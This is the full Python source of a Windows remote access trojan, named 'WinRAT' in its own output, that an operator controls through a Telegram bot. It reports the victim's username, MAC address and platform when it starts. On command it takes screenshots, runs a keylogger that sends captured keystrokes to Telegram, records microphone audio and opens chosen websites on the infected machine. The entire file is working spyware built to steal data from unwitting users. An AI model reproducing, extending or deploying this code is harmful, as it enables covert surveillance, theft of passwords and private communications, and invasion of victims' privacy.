import os
import telepot
from telepot.loop import MessageLoop
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import re, uuid 
import platform
import getpass
import time
import requests
from PIL import ImageGrab
import datetime
import webbrowser
import logging
import threading
import pyHook, pythoncom
from helper import RadiumKeylogger
from helper import RecAudio

CHAT_ID = '000000000'  #Get chat id from telegram app
ACCESS_TOKEN = '9999999999999999999:3q3984fyq3874rhfq8374rfh8q34' # Get access token from botfather in telegram app

MAC_ADDRESS = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
PLAT_FORM = platform.platform()
USER = getpass.getuser()



# buffer = ''
# count_scr = 0
# count_letter = 0
# count_scremail = 0
# check_count = 1234

SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
USERDATA_PATH = SAVE_FILES + "\\User Data\\"
key_log = USERDATA_PATH + "keylog111.txt" 
current_system_time = datetime.datetime.now()
keylogger_stat = 0
default_rec_time = 10
change_rec_time_step = 0
get_url_step = 0
bot = telepot.Bot(ACCESS_TOKEN)
url = ''
keylog_data = '_'



def sendKeylogs():
    global keylog_data
    with open(key_log, 'r') as myfile:
        keylog_data += myfile.read()
    f = open(key_log, 'w').close()
    bot.sendMessage(CHAT_ID, str(keylog_data))
    

def checkKeylogSize():
    while True:
        with open(key_log, 'r') as file:
            text = file.read().strip().split()
            len_chars = sum(len(word) for word in text)
        if (len_chars < 1000 and len_chars > 500) or len_chars > 1000:
            sendKeylogs()
        time.sleep(20)


def internetOn(url='https://www.google.com/', timeout=5):
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        print("No internet connection available.")
    return False
    
    
#print(MAC_ADDRESS, PLAT_FORM, USER, internetOn())

def screenshot():
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    try:
        scr_img = ImageGrab.grab()
        scr_img.save(str(ts) + '.png')
        bot.sendPhoto(CHAT_ID,open(ts+'.png','rb'),caption="Screenshot from " + USER)
        os.remove(str(ts) + '.png')
    except Exception as e:
        print(e)
    return True


def MainMenu_Send():
    #content_type, chat_type, chat_id = telepot.glance(msg)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
       [InlineKeyboardButton(text= "Get Screenshot", callback_data = 'screenshot')],
       [InlineKeyboardButton(text= "Start Keylogger", callback_data = 'start_keylogger')],
       [InlineKeyboardButton(text= "Stop Keylogger", callback_data = 'stop_keylogger')],
       [InlineKeyboardButton(text= "Record audio", callback_data = 'rec_audio')],
       [InlineKeyboardButton(text= "Open website", callback_data = 'open_website')]]
       )

    bot.sendMessage(CHAT_ID, "###Main Menu###\nSelect what you wanna do:", reply_markup=keyboard)

def recAudioMenu(step):
    if step == 1:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
           [InlineKeyboardButton(text= "Time in seconds (default: " + str(default_rec_time) + "  seconds)", callback_data = 'default_rec_time_change')],
           [InlineKeyboardButton(text= "Start Record", callback_data = 'start_rec_audio')],
           [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
           )

        bot.sendMessage(CHAT_ID, "###Audio Recording Menu###\nSelect what you wanna do:", reply_markup=keyboard)
    elif step == 2:
        bot.sendMessage(CHAT_ID, "Enter amount of seconds to be recorded: ")
        global change_rec_time_step
        change_rec_time_step = 1
    #elif step == 3:

def openWebsiteMenu(step, url):
    if step == 1 and url == '':
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
               [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
               )

        bot.sendMessage(CHAT_ID, "###Open Website Menu###\nType in the link (with http or https):", reply_markup=keyboard)
        global get_url_step
        get_url_step = 1
    elif step == 2 and url != '':
        try:
            webbrowser.open(url)
            bot.sendMessage(CHAT_ID, "Website opened in " + USER + " ^_^")
        except:
            bot.sendMessage(CHAT_ID, "Couldn't open website!!!")
    else:
        print("Website link can't be empty!!!")
        return False


def startUpWork():
    if internetOn() == True:
        bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
        screenshot()
        MainMenu_Send()
        
 
def on_callback_query(msg):
    query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
    global keylogger_stat
    
    if query_data == 'screenshot':
        screenshot()
        MainMenu_Send()
    elif query_data == 'start_keylogger':
        if keylogger_stat == 0:
            kLog = threading.Thread(target = RadiumKeylogger.hookslaunch)
            kLog.daemon = True
            kLog.start()
            keylogger_stat = 1
            bot.sendMessage(CHAT_ID, "Keylogger deployed in " + USER + " ^_^")
            f = open(key_log, 'w').close()
            checkLog = threading.Thread(target = checkKeylogSize)
            checkLog.daemon = True
            checkLog.start()
            MainMenu_Send()
        else:
            bot.sendMessage(CHAT_ID, "Keylogger has already been deployed in " + USER + " ^_^")
            MainMenu_Send()
    elif query_data == 'stop_keylogger':
        RadiumKeylogger.STOP_FLAG = False
        keylogger_stat = 0
        bot.sendMessage(CHAT_ID, "Keylogger process killed in " + USER + "!")
        with open(key_log, 'r') as myfile:
            data = myfile.read()
        bot.sendMessage(CHAT_ID, "Keylog Data from " + USER + ":\n" + data)
        MainMenu_Send()
    elif query_data == 'rec_audio':
        recAudioMenu(1)
    elif query_data == 'default_rec_time_change':
        recAudioMenu(2)
    elif query_data == 'start_rec_audio':
        bot.sendMessage(CHAT_ID, "Starting audio recording. Record time " + str(default_rec_time) + " seconds.")
        a_rec = RecAudio.RecordAudio()
        a_rec.start(default_rec_time)
        bot.sendAudio(CHAT_ID, open('output.wav', 'rb'), title = 'Recording from ' + USER + ". Record time " + str(default_rec_time) + " seconds.")
        os.remove('output.wav')
        recAudioMenu(1)
    elif query_data == 'return_main_menu':
        MainMenu_Send()
    elif query_data == 'open_website':
        global url
        openWebsiteMenu(1, url)
 

def on_chat_message(msg):
    global change_rec_time_step
    global default_rec_time
    global get_url_step
    global url
    content_type, chat_type, chat_id = telepot.glance(msg)
    if change_rec_time_step == 1:
        if content_type == 'text' and isinstance(int(msg['text']), int) == True:
            change_rec_time_step = 0
            default_rec_time = int(msg['text'])
            bot.sendMessage(CHAT_ID, "Default audio record time was changed to " + str(default_rec_time) + " seconds! ^_^")
            recAudioMenu(1)
        else:
            bot.sendMessage(CHAT_ID, "Invalid input. Enter an integer instead.")
            recAudioMenu(2)
    elif get_url_step == 1:
        if content_type == 'text' and isinstance(msg['text'], str) == True:
            get_url_step = 0
            url = msg['text']
            openWebsiteMenu(2, url)
            url = ''
            MainMenu_Send()
    else:
        bot.sendMessage(CHAT_ID, "Invalid Command!!!")
        MainMenu_Send()
        
        
print("WinRAT STARTED!!!")            


MessageLoop(bot, {'chat': on_chat_message,
                  'callback_query': on_callback_query}).run_as_thread()

print("Listening...")
startUpWork()
        

while 1:
    time.sleep(10)
